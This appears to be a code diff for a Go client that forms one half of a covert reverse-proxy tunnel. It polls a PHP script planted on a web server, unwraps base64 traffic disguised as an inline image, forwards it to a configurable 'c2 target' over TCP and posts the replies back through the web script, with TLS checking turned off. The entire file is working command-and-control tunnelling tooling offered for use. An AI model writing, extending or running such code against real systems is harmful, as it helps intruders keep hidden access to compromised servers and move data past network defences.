@@ -2,151 +2,216 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/base64"
+	"flag"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
-	"os"
+	"net/url"
 	"strings"
 	"time"
-
-	"github.com/urfave/cli"
 )
 
 var (
-	addr   string
-	target string
+	noneflag   = "Tk9ORQ=="
+	Proxy      = ""
+	client     *http.Client
+	dialTimout = 10 * time.Second
+	keepAlive  = 15 * time.Second
+	str1       = "================"
+	str2       = "<img src=\"data:image/jpg;base64,"
+	str3       = "\" />"
+	lastlen    = 0
+	level      = 0
+	Url        = "http://127.0.0.1/proxy.php"
+	hostPort   = "127.0.0.1:64535"
 )
 
+func init() {
+	flag.StringVar(&Url, "u", "http://127.0.0.1/proxy.php", "url,eg http://127.0.0.1/proxy.php")
+	flag.StringVar(&hostPort, "t", "127.0.0.1:64535", "c2 target,eg 127.0.0.1:64535 ")
+	flag.StringVar(&Proxy, "p", "", "url proxy,eg 8080")
+	flag.IntVar(&level, "v", 0, "log level")
+	flag.Parse()
+	InitHttpClient(Proxy, dialTimout)
+}
+
+// 主函数
+func main() {
+	GetDate()
+}
+
 // 获取数据模块
-func GetDate(cli *cli.Context) {
-	url := cli.String("target")
-	hostPort := cli.String("addr")
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get(url)
-	if err != nil {
-		panic(err)
-	}
-	content, _ := ioutil.ReadAll(resp.Body)
-	resp.Body.Close()
-	if string(content[:15]) == "CONNECT SUCCESS" {
-		fmt.Println(string(content[:15]), "Start getting data ....")
+func GetDate() {
+
+	if check(Url) {
 		for {
-			dataResp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
-			if err != nil {
-				panic(err)
-			}
-			data, _ := ioutil.ReadAll(dataResp.Body)
-			dataResp.Body.Close()
-			if string(data) == "NO DATA" || len(data) == 0 {
+			data, err := getdata(Url)
+			if err != nil || strings.Contains(string(data), noneflag) || len(data) == 0 || len(data) == lastlen {
+				lastlen = len(data)
+				time.Sleep(2 * time.Second)
 				continue
 			}
-			data, _ = base64.URLEncoding.DecodeString(string(data))
-			fmt.Println("获取的数据")
-			fmt.Println(len(data))
-			fmt.Println(data)
-			SendDate(hostPort, data, url)
+			lastlen = len(data)
+			Println("getdata")
+			Println2(data)
+			index1 := bytes.Index(data, []byte(str2))
+			if index1 >= 0 {
+				data = data[index1+len(str2):]
+			}
+			index2 := bytes.Index(data, []byte(str3))
+			if index2 >= 0 {
+				data = data[:index2]
+			}
+
+			data1, err := base64.RawURLEncoding.DecodeString(string(data))
+			if err != nil {
+				fmt.Println("base64 err", err)
+				Println2(data)
+				continue
+			} else {
+				Println2(data1)
+			}
+			if len(data) > 0 {
+				SendDate(hostPort, data1, Url)
+			}
 		}
-	} else {
-		fmt.Println("Please check if the script exists and runs...")
 	}
 }
 
-var dataBuf = make([]byte, 0, 1046616)
+func getdata(Url string) (result []byte, err error) {
+	dataResp, err := client.Post(Url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
+	if err != nil {
+		return
+	}
+	defer dataResp.Body.Close()
+	var buf bytes.Buffer
+	_, err = io.Copy(&buf, dataResp.Body)
+	if err != nil {
+		fmt.Println("read error:", err)
+		return ioutil.ReadAll(dataResp.Body)
+	}
+	return buf.Bytes(), err
+}
 
 // 数据发送模块
 func SendDate(hostPort string, data []byte, url string) {
-	conn, err := net.Dial("tcp", hostPort)
+	Println("senddata")
+	conn, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
 	defer conn.Close()
 	if err != nil {
 		fmt.Printf("connect failed, err : %v\n", err.Error())
 		return
 	}
-	// b64Data, _ := base64.URLEncoding.DecodeString(data)
-	// base64.URLEncoding.EncodeToString()
-	// fmt.Println("Send data to C2:")
-	// fmt.Println("--------------------------------------------------------------")
-	// fmt.Println(string(data))
-	// fmt.Println("--------------------------------------------------------------")
-
-	_, err = conn.Write(data)
+	_, err = write(conn, data)
 	if err != nil {
 		fmt.Printf("write failed , err : %v\n", err)
 	}
-	for {
-		tmp := make([]byte, 1046616)
-		dataErr := conn.SetDeadline(time.Now().Add(1 * time.Second))
-		if dataErr != nil {
-			fmt.Println("End of getting data")
-			break
-		}
-		C2data, err := conn.Read(tmp)
-		dataBuf = append(dataBuf, tmp[:C2data]...)
-		if err != nil {
-			if err != io.EOF {
-				fmt.Println("read error:", err)
-				break
-			}
-		}
-		if C2data == 0 {
-			// fmt.Println("Get data from C2")
-			// fmt.Println(C2data)
-			fmt.Println("发送的数据")
-			fmt.Println(string(dataBuf))
-			C2Send := []byte("DataType=PostData&Data=TO:SEND" + base64.URLEncoding.EncodeToString(dataBuf))
-			client := &http.Client{Timeout: 5 * time.Second}
-			resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
-			if err != nil {
-				panic(err)
-			}
-			resp.Body.Close()
-			dataBuf = append(dataBuf[:0])
-			fmt.Println("End of getting data")
-			// conn.Close()
-			break
-		}
-		// fmt.Println("Get data from C2")
-		// fmt.Println(C2data)
-		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-		// fmt.Println("发送的数据")
-		// fmt.Println(string(tmp[:C2data]))
-		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-		// fmt.Println(len(base64.URLEncoding.EncodeToString(tmp[:C2data])))
-		// fmt.Println(base64.URLEncoding.EncodeToString(tmp[:C2data]))
-
-		// conn.Close()
-		// phpdata, _ := ioutil.ReadAll(resp.Body)
-		// fmt.Println("xxx")
-		// fmt.Println(len(string(phpdata)))
-		// fmt.Println("Send to shell ok!")
-		// time.Sleep(1 * time.Second)
-		// break
+	result, err := read(conn) //TO:SEND
+	C2Send := []byte("DataType=PostData&Data=" + str2 + base64.RawURLEncoding.EncodeToString(result) + str3)
+	Println("post")
+	Println2(C2Send)
+	resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
+	if err != nil {
+		fmt.Println("发送数据error: ", err)
+		return
 	}
-
+	defer resp.Body.Close()
 }
 
-// 主函数
-func main() {
-	app := cli.NewApp()
-	app.Name = "DReverseClint"
-	app.Usage = "A ReverseProxy tools"
-	app.Version = "0.0.1 dev"
-	app.Flags = []cli.Flag{
-		cli.StringFlag{
-			Name:        "addr",
-			Value:       "",
-			Usage:       "C2 addr like 127.0.0.1:8881",
-			Destination: &addr,
-		},
-		cli.StringFlag{
-			Name:        "target",
-			Value:       "",
-			Usage:       "target url like http://example.com/proxy.php",
-			Destination: &target,
-		},
+func check(Url string) (flag bool) {
+	resp, err := client.Get(Url)
+	if err != nil {
+		fmt.Println("check error:", err)
+		return
 	}
-	app.Action = GetDate
-	app.Run(os.Args)
+	content, _ := ioutil.ReadAll(resp.Body)
+	defer resp.Body.Close()
+	if strings.Contains(string(content), noneflag) {
+		fmt.Println("SUCCESS Start getting data ....")
+		return true
+	} else {
+		fmt.Println(string(content))
+		fmt.Println("Please check if the script exists and runs...")
+	}
+	return
+}
+
+func read(conn net.Conn) (result []byte, err error) {
+	var buf bytes.Buffer
+	_, err = io.Copy(&buf, conn)
+	if err != nil {
+		fmt.Println("read error:", err)
+		return
+	}
+	Println(fmt.Sprintf("%v %v", "read ", buf.Len()))
+	Println2(buf.Bytes())
+	return buf.Bytes(), err
+}
+
+func write(conn net.Conn, data []byte) (n int, err error) {
+	Println(fmt.Sprintf("%v %v", "write ", len(data)))
+	Println2(data)
+	n, err = conn.Write(data)
+	return
+}
+
+func Println(result string) {
+	if level > 0 {
+		fmt.Println(str1, result, str1)
+	}
+}
+
+func Println2(data []byte) {
+	switch level {
+	case 2:
+		num := 1000
+		if len(data) > num {
+			fmt.Println(string(data[:num]))
+		} else {
+			fmt.Println(string(data))
+		}
+	case 3:
+		fmt.Println(string(data))
+	default:
+	}
+}
+
+func InitHttpClient(DownProxy string, Timeout time.Duration) error {
+	dialer := &net.Dialer{
+		Timeout:   dialTimout,
+		KeepAlive: keepAlive,
+	}
+
+	tr := &http.Transport{
+		DialContext:         dialer.DialContext,
+		MaxConnsPerHost:     0,
+		MaxIdleConns:        0,
+		MaxIdleConnsPerHost: 100 * 2,
+		IdleConnTimeout:     keepAlive,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+		TLSHandshakeTimeout: 5 * time.Second,
+		DisableKeepAlives:   false,
+	}
+	if DownProxy != "" {
+		if DownProxy == "1" {
+			DownProxy = "http://127.0.0.1:8080"
+		} else if !strings.Contains(DownProxy, "://") {
+			DownProxy = "http://127.0.0.1:" + DownProxy
+		}
+		u, err := url.Parse(DownProxy)
+		if err != nil {
+			return err
+		}
+		tr.Proxy = http.ProxyURL(u)
+	}
+
+	client = &http.Client{
+		Transport: tr,
+		Timeout:   Timeout,
+	}
+	return nil
 }
